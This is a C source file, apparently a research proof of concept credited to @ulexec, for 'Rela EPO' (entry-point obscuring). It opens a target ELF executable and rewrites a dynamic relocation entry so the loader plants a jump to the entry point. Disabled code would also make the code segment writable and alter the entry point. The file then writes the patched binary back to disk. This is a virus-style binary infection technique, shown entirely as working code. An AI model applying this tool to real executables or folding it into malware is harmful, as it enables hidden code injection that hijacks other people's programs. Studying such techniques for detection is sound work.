#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <limits.h>
#include <errno.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdbool.h>
#include <elf.h>


bool alloc_file(int *fd, struct stat *st, const char *filename, uint8_t **buf) { 
	if ((*fd = open(filename, O_RDWR)) < 0) {
       		return false;
   	}
               
  	if (fstat(*fd, st) < 0) {
       		return false;
   	}
                   
   	if ((*buf = mmap(NULL, st->st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE, *fd, 0)) == MAP_FAILED) {
       		return false;
   	}   
   	return true;
}

Elf64_Shdr * get_section_by_index(uint8_t *buf, uint32_t index) {
	Elf64_Ehdr *ehdr;
	Elf64_Shdr *shdr;

	ehdr = (Elf64_Ehdr*)buf;
	shdr = (Elf64_Shdr*)&buf[ehdr->e_shoff];

	return &shdr[index];	
}

Elf64_Shdr * get_section_by_name(uint8_t *buf, const uint8_t *section_name) {
	Elf64_Ehdr *ehdr;
	Elf64_Shdr *shdr;
	uint8_t *shstrtab;
	int i;

	ehdr = (Elf64_Ehdr*)buf;
	shdr = (Elf64_Shdr*)&buf[ehdr->e_shoff];
	shstrtab = &buf[((Elf64_Shdr*)(get_section_by_index(buf, ehdr->e_shstrndx)))->sh_offset];

	for (i = 0; i < ehdr->e_shnum; i++, shdr++) {
		if (!strcmp((const char*)&shstrtab[shdr->sh_name], section_name)) {
			return shdr;
		}
	} 
	return NULL;
}

bool replace_rela_entry(uint8_t *buf, uint64_t reloc_value, uint8_t *symbol_name) {
	Elf64_Shdr *rela_shdr;
	Elf64_Shdr *dynstr_shdr;
	Elf64_Shdr *dynsym_shdr;
	Elf64_Rela *rela;
	Elf64_Sym *dynsym;
	uint8_t *dynstr;
	size_t relasz;
	int i;
#if 0
	if (!(rela_shdr = get_section_by_name(buf, ".rela.text"))) {
		printf("[-] Target binary does not contain a .rela.text section\n");
		return false;
	}
#else 
	if (!(rela_shdr = get_section_by_name(buf, ".rela.dyn"))) {
		printf("[-] Target binary does not contain a .rela.dyn section\n");
		return false;
	}

	if (!(dynstr_shdr = get_section_by_name(buf, ".dynstr"))) {
		printf("[-] Target binary does not contain a .dynstr section\n");
		return false;
	}

	if (!(dynsym_shdr = get_section_by_name(buf, ".dynsym"))) {
		printf("[-] Target binary does not contain a .dynsym section\n");
		return false;
	}
#endif
	relasz = rela_shdr->sh_size/sizeof(Elf64_Rela);
	rela = (Elf64_Rela*)&buf[rela_shdr->sh_offset];
	dynsym = (Elf64_Sym*)&buf[dynsym_shdr->sh_offset];
	dynstr = (uint8_t*)&buf[dynstr_shdr->sh_offset];

	for (i = 0; i < relasz; i++, rela++) {
		Elf64_Sym *sym = &dynsym[ELF64_R_SYM(rela->r_info)];
		printf(" symbol_name %s, &dynstr[%u]: %s \n",  symbol_name,sym->st_name, &dynstr[sym->st_name]);
		if (!strcmp(&dynstr[sym->st_name], symbol_name)) {
                        printf("offset %0lx and r_addend %0lx \n", rela->r_offset, rela->r_addend);
			rela->r_offset = 0;
			rela->r_info = (rela->r_info & ~0xf) | R_X86_64_64;
			rela->r_addend = (reloc_value << 8) | 0xe9;
   			printf("[+] Rela entry for symbol: %s was modified\n", symbol_name);
                        printf("offset %0lx and r_addend %0lx \n", rela->r_offset, rela->r_addend);
			return true;
		}
	} 
	return false;
} 

bool make_code_segment_writable(uint8_t *buf) {
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *phdr;
	int i;

	ehdr = (Elf64_Ehdr*)buf;
	phdr = (Elf64_Phdr*)&buf[ehdr->e_phoff];

	for (i = 0; i < ehdr->e_phnum; i++, phdr++) {
		if (phdr->p_type == PT_LOAD && !phdr->p_offset && phdr->p_flags & PF_X) {
			phdr->p_flags |= PF_W;
   			printf("[+] Code segment has been made writable\n");
			return true;
		}
	}	
	return false;
}

void change_entry_point(uint8_t *buf, uint64_t value) {
	Elf64_Ehdr *ehdr = (Elf64_Ehdr*)buf;
	ehdr->e_entry = value;
	printf("[+] Entry-point was changed to: 0x%lx\n", value);
}

bool reloc_obfuscate(uint8_t *buf) {
	Elf64_Ehdr *ehdr = (Elf64_Ehdr*)buf;
        //if(!replace_rela_entry(buf, ehdr->e_entry, "__gmon_start__")) {
	//if(!replace_rela_entry(buf, ehdr->e_entry, "printf")) {
	if(!replace_rela_entry(buf, ehdr->e_entry, "global")) {
		puts("[-] Relocation entry was not found");
		return false;
	}
#if 0
	if(!make_code_segment_writable(buf)) {
		puts("[-] CODE segment was not found");
		return false;
	}
	change_entry_point(buf, 0);
#endif
	return true;
} 

int main(int argc, char **argv) {
	struct stat st;
	uint8_t *buf;
	int fd;

   	if (!alloc_file(&fd, &st, argv[1], &buf)) {
       		printf("[+] Usage: %s <target binary>\n", argv[0]);
       		return -1;
   	}
   	puts("[*] Rela EPO POC by @ulexec\n"); 
   	if (!reloc_obfuscate(buf)) {
   		puts("[-] Rela EPO failed");
		return -1;
   	}
   	printf("[+] Applying changes to target executable: %s\n", argv[1]);
  	write(fd, buf, st.st_size);
  	return 0;
}
